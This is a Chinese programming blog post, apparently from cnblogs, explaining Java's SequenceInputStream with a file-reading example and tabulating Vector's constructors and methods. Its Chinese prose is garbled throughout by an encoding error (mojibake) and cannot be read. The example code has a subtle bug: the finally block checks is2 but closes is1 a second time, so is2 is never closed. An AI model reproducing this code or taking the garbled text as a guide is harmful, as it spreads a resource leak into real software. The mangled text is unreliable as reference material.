<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220444027-114156103.png" class="lazyload"></p>
<p>â¢ãç¬¬3æ¬¡è¿å¥read()å½æ°<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220454388-832370963.png" class="lazyload"></p>
<p>â£ãç¬¬4æ¬¡è¿å¥read()å½æ°ï¼<em><strong>éç¹æ¯å½åæ­£å¨ä½¿ç¨çè¢«è£é¥°çè¾å¥Streamä¸­çå­èæ°æ®å·²ç»è¯»åå®äºæ¶ï¼åæ¬¡è¯»åï¼ä¼è¿å-1ï¼ä¸ä¼è¿å0</strong></em>ï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220519251-804438398.png" class="lazyload"></p>
<p>æç»ä½¿ç¨èåå»ºçbyte[]æ°ç»ä¸­çå­èï¼byteï¼æ°æ®ï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220532858-840425074.png" class="lazyload"></p>
<h6 id="121ä½¿ç¨ä¸¾ä¾">1.2.1ãä½¿ç¨ä¸¾ä¾</h6>
<p>ââä¸é¢è¿ä¸ªä¾å­å°±æ°å½çä½¿ç¨SequenceInputStreamçread()å½æ°ï¼</p>
<ul>
<li>
<p>æçwindowsæä½ç³»ç»çDçæ ¹ç®å½ä¸æ2ä¸ªtxtæä»¶ï¼ä¸ä¸ªæ¯data1.txtï¼å¦ä¸ä¸ªæ¯data2.txtæä»¶ï¼è¿2ä¸ªæä»¶ä¸­æ»å±æ30ä¸ªå­èï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220203616-2107974847.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220213513-1764667319.png" class="lazyload"></p>
</li>
<li>
<p>ä½¿ç¨èå¯ä»¥ç¨ä¸ä¸ªSequenceInputStreamå¯¹è±¡è£é¥°2ä¸ªè¢«è£é¥°çè¾å¥Streamï¼æ­¤å¤ä¸ºFileInputStreamï¼ï¼å¦ä¸ä»£ç æç¤ºï¼</p>
</li>
</ul>
<pre><code>package com.chelong.StreamAndReader;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.SequenceInputStream;
import java.util.Vector;

public class SequenceInputStreamTest {
   public static void main(String[] args) {
      InputStream is1 = null;
      InputStream is2 = null;
      SequenceInputStream sequenceInputStream = null;
      try {
         is1 = new FileInputStream("D:\\data1.txt");
         is2 = new FileInputStream("D:\\data2.txt");
         Vector&lt;InputStream&gt; vector = new Vector&lt;InputStream&gt;();
         vector.addElement(is1);
         vector.addElement(is2);
         sequenceInputStream = new SequenceInputStream(vector.elements());
         int readByte = -1;
         byte[] buff = new byte[12];
         while ((readByte = sequenceInputStream.read(buff, 0, buff.length)) != -1) {
            for (int i = 0; i &lt; readByte; i++) {
               System.out.print((char) buff[i]);
            }
         }
         System.out.println();
         System.out.println("æç»çå¨byte[]æ°ç»buffä¸­çå­èï¼");
         for (byte b : buff) {
            System.out.print((char) b);
         }
      } catch (IOException e) {
         e.printStackTrace();
      } finally {
         try {
            if (is1 != null) is1.close();
            if (is2 != null) is1.close();
            if (sequenceInputStream != null) sequenceInputStream.close();
         } catch (IOException e) {
            e.printStackTrace();
         }
      }
   }
}
</code></pre>
<p>ç¨åºè¿è¡ç»æï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220724112-1904589148.png" class="lazyload"></p>
<h4 id="äºvectorclassçä¸äºå½æ°è¯´æ">äºãVector.classçä¸äºå½æ°è¯´æ</h4>
<p>ââVector ä¸ ArrayList ä¸æ ·ï¼ä¹æ¯éè¿æ°ç»å®ç°çï¼ä¸åçæ¯å®æ¯æçº¿ç¨çåæ­¥ï¼å³æä¸æ¶å»åªæä¸ä¸ªçº¿ç¨è½å¤å Vectorï¼é¿åå¤çº¿ç¨åæ¶åèå¼èµ·çä¸ä¸è´æ§ï¼ä½å®ç°åæ­¥éè¦å¾é«çè±è´¹ï¼å æ­¤ï¼è®¿é®å®æ¯è®¿é® ArrayListæ¢ãVectorçUMLå¾ï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220751217-1800828263.png" class="lazyload"></p>
<h5 id="21æé å½æ°">2.1ãæé å½æ°</h5>
<table>
<thead>
<tr>
<th style="text-align: left">å½æ°å</th>
<th style="text-align: left">å½æ°è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">public Vector()</td>
<td style="text-align: left">æ­¤æé å½æ°åå»ºçVectorä¸­ï¼Object[]æ°ç»çåå§é¿åº¦ä¸º10ï¼capacityIncrement=0ï¼capacityIncrementè¡¨ç¤ºæ©å®¹æ¶Object[]æ°ç»å¢å çé¿åº¦ï¼å¦æç­äº0çè¯ï¼å½Object[]æ°ç»éè¦æ©å®¹æ¶ï¼æ°çæ°ç»é¿åº¦=2*æ§æ°ç»çé¿åº¦ï¼ä½æ¯æ°çæ°ç»é¿åº¦æå¤§ä¸º2^31-8ï¼</td>
</tr>
<tr>
<td style="text-align: left">public Vector(int initialCapacity)</td>
<td style="text-align: left">æ­¤æé å½æ°åå»ºçVectorä¸­ï¼Object[]æ°ç»çåå§é¿åº¦ä¸ºinitialCapacityï¼capacityIncrement=0ï¼capacityIncrementè¡¨ç¤ºæ©å®¹æ¶Object[]æ°ç»å¢å çé¿åº¦ï¼å¦æç­äº0çè¯ï¼å½Object[]æ°ç»éè¦æ©å®¹æ¶ï¼æ°çæ°ç»é¿åº¦=2*æ§æ°ç»çé¿åº¦ï¼ä½æ¯æ°çæ°ç»é¿åº¦æå¤§ä¸º2^31-8ï¼</td>
</tr>
<tr>
<td style="text-align: left">public Vector(int initialCapacity, int capacityIncrement)</td>
<td style="text-align: left">æ­¤æé å½æ°åå»ºçVectorä¸­ï¼Object[]æ°ç»çåå§é¿åº¦ä¸ºinitialCapacityï¼capacityIncrement=capacityIncrementï¼capacityIncrementè¡¨ç¤ºæ©å®¹æ¶Object[]æ°ç»å¢å çé¿åº¦ï¼å¦æç­äº0çè¯ï¼å½Object[]æ°ç»éè¦æ©å®¹æ¶ï¼æ°çæ°ç»é¿åº¦=2*æ§æ°ç»çé¿åº¦ï¼ä½æ¯æ°çæ°ç»é¿åº¦æå¤§ä¸º2^31-8ï¼</td>
</tr>
<tr>
<td style="text-align: left">public Vector(Collection&lt;? extends E&gt; c)</td>
<td style="text-align: left">æ­¤æé å½æ°åå»ºçVectorä¸­ï¼Object[]æ°ç»çåå§é¿åº¦ä¸ºä¼ å¥éåCollection&lt;? extends E&gt; cçé¿åº¦ï¼capacityIncrement=0ï¼capacityIncrementè¡¨ç¤ºæ©å®¹æ¶Object[]æ°ç»å¢å çé¿åº¦ï¼å¦æç­äº0çè¯ï¼å½Object[]æ°ç»éè¦æ©å®¹æ¶ï¼æ°çæ°ç»é¿åº¦=2*æ§æ°ç»çé¿åº¦ï¼ä½æ¯æ°çæ°ç»é¿åº¦æå¤§ä¸º2^31-8ï¼</td>
</tr>
</tbody>
</table>
<p>2.2ãå¸¸ç¨å½æ°</p>
<table>
<thead>
<tr>
<th style="text-align: left">å½æ°å</th>
<th style="text-align: left">å½æ°è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">boolean add(E o)</td>
<td style="text-align: left">æ­¤å½æ°å°æå®çåç´ è¿½å å°æ­¤Vectorçæ«å°¾ï¼è¯¥å½æ°ä¸addElement()å½æ°çåºå«æ¯ï¼è¯¥()å½æ°æ¯List.interfaceæ¥å£è§å®çå½æ°ï¼addElement()å½æ°æ¯Vectorèªå·±å®ç°çï¼æ¥å£ä¸­æ²¡æè§å®addElement()å½æ°ï¼</td>
</tr>
<tr>
<td style="text-align: left">void add(int index, E element)</td>
<td style="text-align: left">æ­¤å½æ°å°æå®çåç´ æå¥æ­¤Vectorä¸­çæå®ç´¢å¼ä½ç½®</td>
</tr>
<tr>
<td style="text-align: left">boolean addAll(Collection&lt;? extends E&gt; c)</td>
<td style="text-align: left">æ­¤å½æ°å°æå®Collectionä¸­çææåç´ è¿½å å°æ­¤Vectorçæ«å°¾</td>
</tr>
<tr>
<td style="text-align: left">boolean addAll(int index, Collection&lt;? extends E&gt; c)</td>
<td style="text-align: left">æ­¤å½æ°å°æå®Collectionä¸­çææåç´ æå¥å°æ­¤Vectorä¸­çæå®ç´¢å¼ä½ç½®</td>
</tr>
<tr>
<td style="text-align: left">void addElement(E obj)</td>
<td style="text-align: left">æ­¤å½æ°å°æå®çåç´ è¿½å å°æ­¤Vectorçæ«å°¾ï¼è¿ä¸ªå½æ°ä¸add()å½æ°çåºå«æ¯ï¼add()å½æ°æ¯List.interfaceæ¥å£è§å®çå½æ°ï¼è¿ä¸ªå½æ°æ¯Vectorèªå·±å®ç°çï¼æ¥å£ä¸­æ²¡æè§å®è¯¥å½æ°ï¼</td>
</tr>
<tr>
<td style="text-align: left">int capacity()</td>
<td style="text-align: left">æ­¤å½æ°è¿åæ­¤Vectorçå½åå®¹é</td>
</tr>
<tr>
<td style="text-align: left">void clear()</td>
<td style="text-align: left">æ­¤å½æ°ä»æ­¤Vectorä¸­å é¤ææåç´ </td>
</tr>
<tr>
<td style="text-align: left">Object clone()</td>
<td style="text-align: left">æ­¤å½æ°è¿åæ­¤Vectorçåéå¯¹è±¡</td>
</tr>
<tr>
<td style="text-align: left">boolean contains(Object elem)</td>
<td style="text-align: left">å¦ææ­¤Vectoråå«æå®çåç´ ï¼åæ­¤å½æ°è¿åtrue</td>
</tr>
<tr>
<td style="text-align: left">boolean containsAll(Collection&lt;?&gt; c)</td>
<td style="text-align: left">å¦ææ­¤Vectoråå«æå®Collectionä¸­çææåç´ ï¼åæ­¤å½æ°è¿åtrue</td>
</tr>
<tr>
<td style="text-align: left">void copyInto(Object[] anArray)</td>
<td style="text-align: left">æ­¤æ¹æ³å°æ­¤åéçç»ä»¶å¤å¶å°æå®çæ°ç»ä¸­</td>
</tr>
<tr>
<td style="text-align: left">E elementAt(int index)</td>
<td style="text-align: left">æ­¤å½æ°è¿åVectoræå®ç´¢å¼å¤çåç´ </td>
</tr>
<tr>
<td style="text-align: left">Enumeration<e> elements()</e></td>
<td style="text-align: left">æ­¤å½æ°è¿åæ­¤Vectorä¸­æåå«çææåç´ çæä¸¾ã</td>
</tr>
<tr>
<td style="text-align: left">void ensureCapacity(int minCapacity)</td>
<td style="text-align: left">æ­¤å½æ°å¯å¢å æ­¤Vectorçå®¹éï¼ä»¥ç¡®ä¿å®è³å°å¯ä»¥ä¿å­æå°å®¹éåç´ ä¸ªæ°</td>
</tr>
<tr>
<td style="text-align: left">boolean equals(Object o)</td>
<td style="text-align: left">æ­¤å½æ°å°æå®çObjectä¸æ­¤Vectorè¿è¡æ¯è¾ä»¥è·å¾ç¸ç­æ§</td>
</tr>
<tr>
<td style="text-align: left">E firstElement()</td>
<td style="text-align: left">è¿åæ­¤Vectorçç¬¬ä¸ä¸ªåç´ ï¼ä½äºObject[]æ°ç»ç´¢å¼ 0 å¤çåç´ ï¼</td>
</tr>
<tr>
<td style="text-align: left">E get(int index)</td>
<td style="text-align: left">è¿åVectorä¸­æå®ç´¢å¼ä½ç½®çåç´ </td>
</tr>
<tr>
<td style="text-align: left">int indexOf(Object elem)</td>
<td style="text-align: left">æç´¢ç»å®åæ°çç¬¬ä¸ä¸ªå¹éé¡¹ï¼ä½¿ç¨ equals ()å½æ°æµè¯ç¸ç­æ§</td>
</tr>
<tr>
<td style="text-align: left">int indexOf(Object elem, int index)</td>
<td style="text-align: left">æç´¢ç»å®åæ°çç¬¬ä¸ä¸ªå¹éé¡¹ï¼ä» index å¤å¼å§æç´¢ï¼å¹¶ä½¿ç¨ equals()å½æ°æµè¯å¶ç¸ç­æ§</td>
</tr>
<tr>
<td style="text-align: left">void insertElementAt(E obj, int index)</td>
<td style="text-align: left">å°æå®å¯¹è±¡ä½ä¸ºæ­¤Vectorä¸­çåç´ æå¥å°æå®ç ç´¢å¼ä½ç½®</td>
</tr>
<tr>
<td style="text-align: left">boolean isEmpty()</td>
<td style="text-align: left">æµè¯æ­¤Vectorä¸­çæ¯å¦ä¸åå«ä»»ä½åç´ </td>
</tr>
<tr>
<td style="text-align: left">E lastElement()</td>
<td style="text-align: left">è¿åæ­¤Vectorçæåä¸ä¸ªåç´ ï¼ä½äºObject[]æ°ç»ç´¢å¼ Object[].length-1 å¤çåç´ ï¼</td>
</tr>
<tr>
<td style="text-align: left">int lastIndexOf(Object elem)</td>
<td style="text-align: left">è¿åæå®çå¯¹è±¡å¨æ­¤Vectorä¸­æåä¸ä¸ªå¹éé¡¹çç´¢å¼</td>
</tr>
<tr>
<td style="text-align: left">int lastIndexOf(Object elem, int index)</td>
<td style="text-align: left">ä»æå®çç´¢å¼å¤å¼å§ååæç´¢æå®çå¯¹è±¡ï¼å¹¶è¿åæç´¢å°çæåä¸ä¸ªç´¢å¼</td>
</tr>
<tr>
<td style="text-align: left">E remove(int index)</td>
<td style="text-align: left">ç§»é¤æ­¤Vectorä¸­æå®ç´¢å¼ä½ç½®çåç´ </td>
</tr>
<tr>
<td style="text-align: left">boolean remove(Object o)</td>
<td style="text-align: left">ç§»é¤æ­¤Vectorä¸­æå®åç´ çç¬¬ä¸ä¸ªå¹éé¡¹ï¼å¦ææ­¤Vectorä¸åå«è¯¥åç´ ï¼åææåç´ ä¿æä¸åï¼å¹¶è¿åfalse</td>
</tr>
<tr>
<td style="text-align: left">boolean removeAll(Collection&lt;?&gt; c)</td>
<td style="text-align: left">ä»æ­¤Vectorä¸­ç§»é¤åå«å¨æå® Collection ä¸­çææåç´ </td>
</tr>
<tr>
<td style="text-align: left">void removeAllElements()</td>
<td style="text-align: left">ä»æ­¤Vectorä¸­ç§»é¤å¨é¨åç´ ï¼å¹¶è®¾ç½®elementCount=0ï¼è¯¥åéè¡¨ç¤ºæ­¤Vectorå¯¹è±¡ä¸­ææåç´ çæ°éï¼ï¼Object[]æ°ç»çé¿åº¦ä¸åã</td>
</tr>
<tr>
<td style="text-align: left">void removeElementAt(int index)</td>
<td style="text-align: left">å é¤æå®ç´¢å¼å¤çåç´ </td>
</tr>
<tr>
<td style="text-align: left">protected void removeRange(int fromIndex, int toIndex)</td>
<td style="text-align: left">ä»æ­¤ Vector ä¸­ç§»é¤ç´¢å¼ä½äº [fromIndex, toIndex)ï¼å·¦é­å³å¼ï¼ä¹é´çææåç´ </td>
</tr>
<tr>
<td style="text-align: left">boolean retainAll(Collection&lt;?&gt; c)</td>
<td style="text-align: left">å¦ææ­¤Vectorä¸­åå«æå® Collection ä¸­çææåç´ ï¼æ­¤å½æ°è¿åtrue</td>
</tr>
<tr>
<td style="text-align: left">E set(int index, E element)</td>
<td style="text-align: left">ç¨æå®çåç´ æ¿æ¢æ­¤Vectorä¸­æå®ç´¢å¼å¤çåç´ </td>
</tr>
<tr>
<td style="text-align: left">void setElementAt(E obj, int index)</td>
<td style="text-align: left">å°æ­¤Vectoræå® ç´¢å¼å¤çåç´ è®¾ç½®ä¸ºæå®çå¦ä¸ä¸ªåç´ </td>
</tr>
<tr>
<td style="text-align: left">void setSize(int newSize)</td>
<td style="text-align: left">è®¾ç½®æ­¤Vectorçå¤§å°</td>
</tr>
<tr>
<td style="text-align: left">int size()</td>
<td style="text-align: left">è¿åæ­¤Vectorä¸­çåç´ æ°</td>
</tr>
<tr>
<td style="text-align: left">List<e> subList(int fromIndex, int toIndex)</e></td>
<td style="text-align: left">è¿åæ­¤ Vectorçå­éï¼è¯¥å­éçåç´ èå´ä¸º [fromIndex, toIndex)ï¼å·¦é­å³å¼ï¼ç´¢å¼ä½ç½®çææåç´ </td>
</tr>
<tr>
<td style="text-align: left">Object[] toArray()</td>
<td style="text-align: left">è¿åä¸ä¸ªObject[]æ°ç»ï¼åå«æ­¤Vectorä¸­ä»¥æ­£ç¡®é¡ºåºå­æ¾çææåç´ </td>
</tr>
<tr>
<td style="text-align: left">String toString()</td>
<td style="text-align: left">è¿åæ­¤Vectorçå­ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ï¼å¶ä¸­åå«æ¯ä¸ªåç´ ç String è¡¨ç¤ºå½¢å¼</td>
</tr>
</tbody>
</table>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.0006944444444444445" data-date-updated="2026-02-15 22:26">2026-02-15 22:25</span>&nbsp;
<a href="https://www.cnblogs.com/Carey-ccl">Carey_ccl</a>&nbsp;
éè¯»(<span id="post_view_count">18</span>)&nbsp;
è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19618752);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19618752', targetLink: 'https://www.cnblogs.com/Carey-ccl/p/19618752', title: '8ãSequenceInputStreamçæºç åVector.classçä¸äºå½æ°è¯´æï¼windowsæä½ç³»ç»ï¼JDK8ï¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
        </channel>
        </rss>